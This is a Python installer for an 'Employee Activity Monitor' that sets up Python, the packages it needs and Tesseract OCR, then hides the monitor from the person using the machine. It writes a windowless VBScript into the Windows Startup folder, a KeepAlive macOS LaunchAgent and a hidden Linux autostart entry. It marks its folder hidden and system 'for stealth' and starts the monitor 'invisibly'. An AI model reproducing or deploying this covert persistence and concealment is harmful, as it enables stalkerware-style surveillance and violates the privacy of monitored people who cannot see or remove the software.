#!/usr/bin/env python3
"""
Standalone installer - Downloads Python if not available and sets up the monitor.
Run with: python install_and_run.py
"""

import os
import sys
import subprocess
import urllib.request
import zipfile
import tempfile
import shutil
import json
import platform
import socket
from pathlib import Path

PYTHON_DOWNLOAD_URL = "https://www.python.org/ftp/python/3.12.0/python-3.12.0-amd64.exe"
PYTHON_VERSION_MIN = (3, 8)
WINDOWS_ONLY_REQUIREMENTS = {"pywin32", "pypiwin32"}

def is_windows():
    return os.name == 'nt'

def is_macos():
    return sys.platform == 'darwin'

def is_linux():
    return sys.platform.startswith('linux')

def script_dir():
    return Path(__file__).resolve().parent

def resolve_python_executable():
    return shutil.which('python3') or shutil.which('python') or sys.executable

def check_python():
    try:
        version = sys.version_info
        if version.major >= PYTHON_VERSION_MIN[0] and version.minor >= PYTHON_VERSION_MIN[1]:
            print(f"[OK] Python {version.major}.{version.minor}.{version.micro} detected")
            return True
    except:
        pass
    print("[!] Python 3.8+ required but not found")
    return False

def download_file(url, dest):
    def report_progress(block_num, block_size, total_size):
        downloaded = block_num * block_size
        percent = min(100, downloaded * 100 // total_size) if total_size > 0 else 0
        print(f"\r  Downloading... {percent}%", end='', flush=True)
    
    print(f"Downloading Python from {url}...")
    urllib.request.urlretrieve(url, dest, reporthook=report_progress)
    print("\n  Download complete!")

def install_python():
    if not is_windows():
        print("[ERROR] Python is required on this platform. Install Python 3 and rerun the installer.")
        return False

    print("\n[INFO] Python not found. Installing...")
    
    with tempfile.NamedTemporaryFile(suffix='.exe', delete=False) as tmp:
        installer_path = tmp.name
    
    try:
        download_file(PYTHON_DOWNLOAD_URL, installer_path)
        print("\n[INFO] Running Python installer...")
        print("  (This requires administrator privileges)")
        
        result = subprocess.run(
            [installer_path, '/quiet', 'InstallAllUsers=1', 'PrependPath=1', 'Include_test=0'],
            capture_output=True
        )
        
        if result.returncode == 0:
            print("[OK] Python installed successfully!")
            
            import ctypes
            import time
            for _ in range(10):
                if shutil.which('python'):
                    break
                time.sleep(1)
            
            return True
        else:
            print(f"[ERROR] Installation failed: {result.stderr.decode()}")
            return False
    finally:
        try:
            os.unlink(installer_path)
        except:
            pass




def install_requirements():
    print("\n[INFO] Installing required Python packages from requirements.txt...")
    try:
        requirements_path = script_dir() / 'requirements.txt'
        packages = []

        for raw_line in requirements_path.read_text(encoding='utf-8').splitlines():
            line = raw_line.strip()
            if not line or line.startswith('#'):
                continue

            package_name = line.split('[')[0].split('==')[0].split('>=')[0].split('<=')[0].split('~=')[0].strip().lower()
            if not is_windows() and package_name in WINDOWS_ONLY_REQUIREMENTS:
                continue

            packages.append(line)

        if packages:
            subprocess.check_call(
                [sys.executable, '-m', 'pip', 'install', '-q', *packages],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        print("[OK] Packages installed successfully.")
    except Exception as e:
        print(f"[FAIL] {e}")

    if is_windows():
        print("\n[INFO] Running post-install for pywin32...")
        try:
            subprocess.check_call(
                [sys.executable, '-m', 'pywin32_postinstall', '-install'],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        except Exception:
            pass
    
    # Post-install logic finished.

def check_tesseract():
    candidates = [
        os.environ.get('TESSERACT_CMD', '').strip(),
        shutil.which('tesseract'),
    ]

    if is_windows():
        candidates.extend([
            r'C:\Program Files\Tesseract-OCR\tesseract.exe',
            r'C:\Program Files (x86)\Tesseract-OCR\tesseract.exe',
            os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Programs', 'Tesseract-OCR', 'tesseract.exe'),
        ])
    else:
        candidates.extend([
            '/opt/homebrew/bin/tesseract',
            '/usr/local/bin/tesseract',
            '/usr/bin/tesseract',
        ])

    for candidate in candidates:
        if candidate and os.path.exists(candidate):
            print(f"[OK] Tesseract found: {candidate}")
            return True

    if shutil.which('tesseract'):
        print(f"[OK] Tesseract found on PATH: {shutil.which('tesseract')}")
        return True

    print("[ERROR] Tesseract OCR is required but was not found.")
    print("        Install Tesseract OCR and rerun the installer.")
    return False


def setup_autostart():
    print("\n[INFO] Setting up hidden background auto-start...")

    monitor_path = script_dir() / 'monitor.py'
    python_bin = resolve_python_executable()

    if is_windows():
        startup_folder = os.path.join(os.environ.get('APPDATA', str(Path.home())), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        vbs_path = os.path.join(startup_folder, 'EmployeeMonitor.vbs')

        # VBScript executes pythonw (windowless python) fully hidden (0 flag)
        # Using specific environment variable definition solves Unicode logging crashes
        vbs_content = f'''Set WshShell = CreateObject("WScript.Shell")
WshShell.CurrentDirectory = "{monitor_path.parent}"
Set colSystemEnvVars = WshShell.Environment("Process")
colSystemEnvVars("PYTHONIOENCODING") = "utf-8"
WshShell.Run "pythonw.exe \"" & "{monitor_path}" & "\"", 0, False
'''

        try:
            Path(vbs_path).parent.mkdir(parents=True, exist_ok=True)
            with open(vbs_path, 'w', encoding='utf-16') as f:
                f.write(vbs_content)
            print(f"[OK] Background auto-start (VBS method) enabled: {vbs_path}")
            return True
        except Exception as e:
            print(f"[WARN] Could not create startup entry: {e}")
            return False

    if is_macos():
        launch_agents = Path.home() / 'Library' / 'LaunchAgents'
        launch_agents.mkdir(parents=True, exist_ok=True)
        plist_path = launch_agents / 'com.eyeing.monitor.plist'
        plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>com.eyeing.monitor</string>
  <key>ProgramArguments</key>
  <array>
    <string>{python_bin}</string>
    <string>{monitor_path}</string>
  </array>
  <key>RunAtLoad</key>
  <true/>
  <key>KeepAlive</key>
  <true/>
  <key>WorkingDirectory</key>
  <string>{monitor_path.parent}</string>
</dict>
</plist>
'''
        plist_path.write_text(plist_content, encoding='utf-8')
        print(f"[OK] Background auto-start enabled for macOS: {plist_path}")
        return True

    if is_linux():
        autostart_dir = Path.home() / '.config' / 'autostart'
        autostart_dir.mkdir(parents=True, exist_ok=True)
        desktop_path = autostart_dir / 'employee-monitor.desktop'
        desktop_content = f'''[Desktop Entry]
Type=Application
Name=Employee Monitor
Exec="{python_bin}" "{monitor_path}"
Terminal=false
X-GNOME-Autostart-enabled=true
NoDisplay=true
'''
        desktop_path.write_text(desktop_content, encoding='utf-8')
        print(f"[OK] Background auto-start enabled for Linux: {desktop_path}")
        return True

    print("[WARN] Auto-start is not configured for this platform.")
    return False

def protect_folder():
    print("\n[INFO] Applying folder hiding for stealth...")
    folder_path = os.path.abspath(os.path.dirname(__file__) or '.')

    if not is_windows():
        print("[INFO] Folder hiding is Windows-only; skipping on this platform.")
        return

    try:
        # Keep the folder hidden/system, but do not set deny-delete ACL.
        # Deny ACL slows down and can block complete remote uninstall.
        subprocess.run(['attrib', '+h', '+s', folder_path], capture_output=True)
        
        print("[OK] Folder is hidden from standard view.")
        print("       (To reverse: run 'attrib -h -s .\\')")
    except Exception as e:
        print(f"[WARN] Could not apply folder protection: {e}")

def save_install_context():
    try:
        base = script_dir()
        data_dir = base / 'activity_data'
        data_dir.mkdir(parents=True, exist_ok=True)

        context = {
            'install_id': os.environ.get('INSTALL_ID', '').strip(),
            'device_id': os.environ.get('DEVICE_ID', '').strip() or os.environ.get('COMPUTERNAME', '').strip() or os.environ.get('HOSTNAME', '').strip() or socket.gethostname(),
            'backend_url': os.environ.get('BACKEND_URL', '').strip()
        }

        with open(data_dir / 'install_context.json', 'w', encoding='utf-8') as f:
            json.dump(context, f, indent=2)
        print('[OK] Saved install context for monitor identity resolution.')
    except Exception as e:
        print(f"[WARN] Could not save install context: {e}")

def main():
    print("=" * 60)
    print("  EMPLOYEE ACTIVITY MONITOR - INSTALLER")
    print("=" * 60)
    
    if not check_python():
        if is_windows() and '--no-install' not in sys.argv:
            install_python()
            print("\n[INFO] Please restart this script after Python installation.")
            input("Press Enter to exit...")
            sys.exit(0)

        if '--no-install' in sys.argv:
            print("\n[ERROR] Python is required. Please install from python.org")
            input("Press Enter to exit...")
            sys.exit(1)

        print("\n[ERROR] Python 3.8+ is required. Please install Python and rerun this installer.")
        sys.exit(1)
    
    install_requirements()
    if not check_tesseract():
        input("Press Enter to exit...")
        sys.exit(1)
    save_install_context()
    
    if '--autostart' in sys.argv or os.environ.get('SETUP_AUTOSTART'):
        setup_autostart()
    
    # Apply folder hiding and deletion lock
    protect_folder()
    
    print("\n" + "=" * 60)
    print("  INSTALLATION COMPLETE!")
    print("=" * 60)
    print()
    
    if '--no-run' not in sys.argv:
        print("Starting monitor in the background...")
        print()
        
        os.chdir(str(script_dir()))

        if is_windows():
            # We start the monitor in the background via the startup VBScript
            startup_folder = os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            vbs_path = os.path.join(startup_folder, 'EmployeeMonitor.vbs')

            if os.path.exists(vbs_path):
                try:
                    subprocess.Popen(['wscript.exe', vbs_path], shell=False)
                    print("[OK] Monitor has successfully started in the background!")
                    print("     It will continue running invisibly and restart automatically on PC boot.")
                except Exception as e:
                    print(f"[ERROR] Could not start hidden monitor: {e}")
            else:
                print("[WARN] VBScript not found. Running monitor directly (will attach to terminal)...")
                try:
                    subprocess.Popen([sys.executable, 'monitor.py'])
                except Exception as e:
                    print(e)
        else:
            try:
                subprocess.Popen([sys.executable, str(script_dir() / 'monitor.py')], cwd=str(script_dir()), start_new_session=True)
                print("[OK] Monitor has successfully started in the background!")
            except Exception as e:
                print(f"[ERROR] Could not start monitor: {e}")

if __name__ == '__main__':
    main()
